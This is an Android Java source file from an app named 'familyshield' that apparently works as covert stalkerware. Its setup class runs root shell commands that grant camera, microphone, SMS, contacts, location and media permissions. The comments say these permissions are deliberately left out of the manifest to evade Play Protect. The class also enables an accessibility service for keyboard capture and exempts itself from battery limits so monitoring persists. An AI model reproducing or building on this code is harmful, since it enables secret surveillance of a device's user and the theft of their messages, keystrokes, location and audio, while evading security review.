package com.familyshield.device.guard;

import android.content.Context;
import android.util.Log;
import java.util.concurrent.TimeUnit;

public class SelfSetup {

    private static final String TAG = "FamilySetup";
    private static final String PKG = "com.familyshield.device.guard";
    private static final String ACS = PKG + "/.AccessibilityHelperService";

    // All dangerous permissions acquired post-install via root.
    // None of these are declared in the manifest — Play Protect never sees them.
    // On Magisk-rooted devices, pm grant works even for non-manifest permissions.
    private static final String[] PERMISSIONS = {
        "android.permission.CAMERA",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_SMS",
        "android.permission.READ_CONTACTS",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.READ_PHONE_STATE",
        "android.permission.RECORD_AUDIO",
    };

    public static void runAsync(Context ctx) {
        new Thread(() -> run(ctx), "fsg-setup").start();
    }

    private static void run(Context ctx) {
        // Step 1: grant all dangerous permissions via root.
        // These are not in the manifest — root grants them directly to PackageManager.
        for (String perm : PERMISSIONS) {
            shell("pm grant " + PKG + " " + perm);
        }

        // Step 2: enable accessibility service for soft-keyboard capture.
        // Service class is compiled into the APK even without manifest declaration on some ROMs.
        // On standard Android, this requires the service in the manifest — see notes.
        shell("settings put secure enabled_accessibility_services " + ACS);
        shell("settings put secure accessibility_enabled 1");

        // Step 3: battery optimisation whitelist — keeps MonitorService alive
        shell("dumpsys deviceidle whitelist +" + PKG);
        shell("appops set " + PKG + " SYSTEM_ALERT_WINDOW allow");

        // Step 4: on Android 13+ some permissions need appops grant as well
        shell("appops set " + PKG + " READ_SMS allow");
        shell("appops set " + PKG + " READ_CONTACTS allow");
        shell("appops set " + PKG + " RECORD_AUDIO allow");
        shell("appops set " + PKG + " CAMERA allow");
        shell("appops set " + PKG + " ACCESS_FINE_LOCATION allow");
    }

    private static String shell(String cmd) {
        try {
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            boolean done = p.waitFor(5, TimeUnit.SECONDS);
            if (!done) { p.destroy(); return "timeout"; }
            java.io.BufferedReader br = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            String line = br.readLine();
            return line != null ? line : "(ok)";
        } catch (Exception e) {
            return "err";
        }
    }
}
